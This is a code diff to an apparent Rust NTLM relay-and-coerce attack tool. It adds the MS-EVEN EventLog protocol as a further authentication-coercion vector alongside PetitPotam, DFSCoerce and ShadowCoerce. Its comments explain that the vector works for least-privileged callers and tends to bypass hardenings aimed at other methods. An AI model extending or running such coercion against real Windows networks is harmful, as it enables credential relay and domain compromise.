@@ -1538,6 +1538,13 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
         //   MS-FSRVP (ShadowCoerce) - opcode IsPathSupported. KB5005413 left
         //                             this RPC interface unhardened; produces
         //                             auth back to the listener on Win2022.
+        //   MS-EVEN (ElfrOpenBELW)  - EventLog Remote Protocol backup-file
+        //                             open. The UNC argument triggers auth
+        //                             before any actual log access, so even
+        //                             a least-privileged caller fires the
+        //                             callback. Often slips past hardenings
+        //                             aimed at EFSR/RPRN/DFSCoerce because
+        //                             it's a different RPC surface entirely.
         //   MS-EFSR + http auth     - re-tries EFSRPC via the WebClient
         //                             (WebDAV) path. UNC Hardened Access
         //                             defaults block IP-literal SMB UNCs but
@@ -1553,6 +1560,7 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
         //                             servers may still leak.
         for (proto, auth_type) in [
             ("MS-FSRVP", "smb"),
+            ("MS-EVEN", "smb"),
             ("MS-EFSR", "http"),
             ("MS-EFSR", "smb"),
             ("MS-RPRN", "smb"),
@@ -2438,6 +2446,7 @@ mod tests {
     const PHASE1: &str = "unauth PetitPotam";
     const PHASE2: &str = "DFSCoerce";
     const PHASE3_FSRVP: &str = "coerce via MS-FSRVP (smb)";
+    const PHASE3_EVEN: &str = "coerce via MS-EVEN (smb)";
     const PHASE3_EFSR_HTTP: &str = "coerce via MS-EFSR (http)";
     const PHASE3_EFSR: &str = "coerce via MS-EFSR (smb)";
     const PHASE3_RPRN: &str = "coerce via MS-RPRN (smb)";
@@ -2616,6 +2625,7 @@ mod tests {
                 PHASE1,
                 PHASE2,
                 PHASE3_FSRVP,
+                PHASE3_EVEN,
                 PHASE3_EFSR_HTTP,
                 PHASE3_EFSR,
                 PHASE3_RPRN
